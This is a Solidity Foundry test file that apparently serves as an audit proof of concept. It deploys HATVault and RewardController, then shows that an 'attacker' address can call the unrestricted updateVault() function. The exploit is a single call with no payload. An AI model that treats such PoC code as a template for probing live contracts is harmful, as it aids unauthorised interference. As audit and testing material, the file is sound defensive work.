// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

//@dev - Foundry
import { Test } from "forge-std/Test.sol";

import "forge-std/console.sol";

//@dev - Target contract
import { RewardController } from "../../contracts/RewardController.sol";

import { HATVault } from "../../contracts/HATVault.sol";


/**
 * @notice - The test of exploit of the RewardController.sol in Foundry
 */
contract RewardControllerExploitTest is Test {

    //@dev - Smart contract instances
    RewardController public rewardController;
    HATVault public hatVault;

    address GOVERNANCE = makeAddr("governance");
    address MINTER = makeAddr("minter");

    address ATTACKER = makeAddr("attacker");


    /**
     * @dev - Constructor
     */ 
    function setUp() public {
        //@dev - Deploy the Vault
        hatVault = new HATVault();
        console.log("Deployed-address of the HATVault.sol:", address(hatVault));

        //@dev - Parameters for initialize() method in the RewardController.sol
        address _rewardToken = 0x51a6Efc15c50EcE1DaAD1Ee4fbF8DEC76584c365;
        address _hatsGovernance = 0xBA5Ddb6Af728F01E91D77D12073548D823f6D1ef;
        uint256 _startRewardingBlock = 0;
        uint256 _epochLength = 195200;
        uint256[24] memory _epochRewardPerBlock = [
            uint256(4413 * 1e17),  // 441.3
            uint256(4413 * 1e17),
            uint256(8825 * 1e17),
            uint256(7788 * 1e17),
            uint256(6873 * 1e17),
            uint256(6065 * 1e17),
            uint256(5353 * 1e17),
            uint256(4724 * 1e17),
            uint256(4169 * 1e17),
            uint256(3679 * 1e17),
            uint256(3247 * 1e17),
            uint256(2865 * 1e17),
            uint256(2528 * 1e17),
            uint256(2231 * 1e17),
            uint256(1969 * 1e17),
            uint256(1738 * 1e17),
            uint256(1534 * 1e17),
            uint256(1353 * 1e17),
            uint256(1194 * 1e17),
            uint256(1054 * 1e17),
            uint256(93 * 1e17),
            uint256(821 * 1e17),
            uint256(724 * 1e17),
            uint256(639 * 1e17)
        ];

        //@dev - Deploy the RewardController.sol
        rewardController = new RewardController();
        console.log("Deployed-address of the RewardController.sol:", address(rewardController));

        //@dev - Initialize the RewardController.sol
        rewardController.initialize(
            _rewardToken,
            _hatsGovernance,
            _startRewardingBlock,
            _epochLength,
            _epochRewardPerBlock
        );
        console.log("initialize() - The RewardController.sol has been initialized");
    }

    /**
     * @dev - Check initial states
     */ 
    function testCheck_initialStates() public {
        //@dev - EOA wallet address of attacker
        console.log("EOA wallet address of attacker:", ATTACKER);
    }

    /**
     * @notice - Execute a test to show exploit using updateVault() method in the RewardController.sol
     * @notice - This PoC of exploit is that anyone (any external users) can execute updateVault() function in the RewardController.sol
     */ 
    function testExploit_updateVault() public {
        //@dev - Set an attacer's EOA address as a caller 
        vm.startPrank(ATTACKER);

        //@dev - Call updateVault() function by the attacer's EOA address
        rewardController.updateVault(address(hatVault));

        vm.stopPrank();

        console.log("Successful to run testExploit_updateVault()");
    }

}